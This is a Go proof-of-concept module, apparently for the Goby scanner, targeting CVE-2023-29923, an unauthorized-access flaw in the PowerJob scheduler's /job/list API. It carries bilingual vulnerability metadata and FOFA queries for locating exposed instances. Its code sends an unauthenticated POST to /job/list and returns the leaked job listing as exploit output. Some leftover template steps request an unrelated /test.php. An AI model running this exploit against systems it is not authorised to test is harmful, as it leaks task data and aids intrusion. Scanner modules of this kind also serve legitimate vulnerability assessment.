package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PowerJob /job/list api unauthorized access vulnerability",
    "Description": "<p>PowerJob (formerly OhMyScheduler) is a new generation of distributed scheduling and computing framework that allows you to easily complete job scheduling and distributed computing of complex tasks.</p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Product": "PowerJob",
    "Homepage": "https://github.com/PowerJob/PowerJob",
    "DisclosureDate": "2023-03-15",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "(title=\"PowerJob\" && body=\"We're sorry but oms-console\") || (banner=\"Content-Length: 1222\" || banner=\"Content-Length: 1260\") && banner=\"Vary: Origin\" && banner=\"Vary: Access-Control-Request-Headers\" && banner!=\"X-Content-Type-Options: nosniff\"",
    "GobyQuery": "(title=\"PowerJob\" && body=\"We're sorry but oms-console\") || (banner=\"Content-Length: 1222\" || banner=\"Content-Length: 1260\") && banner=\"Vary: Origin\" && banner=\"Vary: Access-Control-Request-Headers\" && banner!=\"X-Content-Type-Options: nosniff\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit an unauthorized access vulnerability in /job/list to obtain task information for the entire system, which could ultimately result in the system being in an extremely insecure state.</p>",
    "Recommendation": "<p>Currently, there is no detailed solution available. Please follow updates on the vendor's homepage: <a href=\"https://github.com/PowerJob/PowerJob\">https://github.com/PowerJob/PowerJob</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2023-29923"
    ],
    "CNNVD": [
        "CNNVD-202304-1612"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.3",
    "Translation": {
        "CN": {
            "Name": "PowerJob /job/list 接口未授权访问漏洞",
            "Product": "PowerJob",
            "Description": "<p>PowerJob（原OhMyScheduler）是全新一代分布式调度与计算框架，能让您轻松完成作业的调度与繁杂任务的分布式计算。</p><p>攻击者可通过 &nbsp;/job/list 未授权访问漏洞获取整个系统的任务信息，可能会最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://github.com/PowerJob/PowerJob\" target=\"_blank\">https://github.com/PowerJob/PowerJob</a><br></p>",
            "Impact": "<p>攻击者可通过 &nbsp;/job/list 未授权访问漏洞获取整个系统的任务信息，可能会最终导致系统处于极度不安全状态。</p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "PowerJob /job/list api unauthorized access vulnerability",
            "Product": "PowerJob",
            "Description": "<p>PowerJob (formerly OhMyScheduler) is a new generation of distributed scheduling and computing framework that allows you to easily complete job scheduling and distributed computing of complex tasks.</p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
            "Recommendation": "<p>Currently, there is no detailed solution available. Please follow updates on the vendor's homepage: <a href=\"https://github.com/PowerJob/PowerJob\" target=\"_blank\">https://github.com/PowerJob/PowerJob</a><br></p>",
            "Impact": "<p>Attackers can exploit an unauthorized access vulnerability in /job/list to obtain task information for the entire system, which could ultimately result in the system being in an extremely insecure state.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10778"
}`
	send_payloadJSIODUAO := func(hostinfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := "/job/list"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.Header.Store("Content-Length", "35")
		cfg.Header.Store("Accept-Encoding", "gzip, deflate")
		cfg.Header.Store("Content-Type", "application/json;charset=UTF-8")
		cfg.Header.Store("Connection", "close")
		cfg.Header.Store("Accept", "application/json, text/plain")
		cfg.Data = `{"appId":1,"index":0,"pageSize":10}`
		return httpclient.DoHttpRequest(hostinfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := send_payloadJSIODUAO(hostinfo)
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "success\":true,") && strings.Contains(resp.Utf8Html, ",\"data\":[") && strings.Contains(resp.Utf8Html, ",\"jobName\":")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, _ := send_payloadJSIODUAO(expResult.HostInfo)
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "success\":true,") && strings.Contains(resp.Utf8Html, ",\"data\":[") && strings.Contains(resp.Utf8Html, ",\"jobName\":"){
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
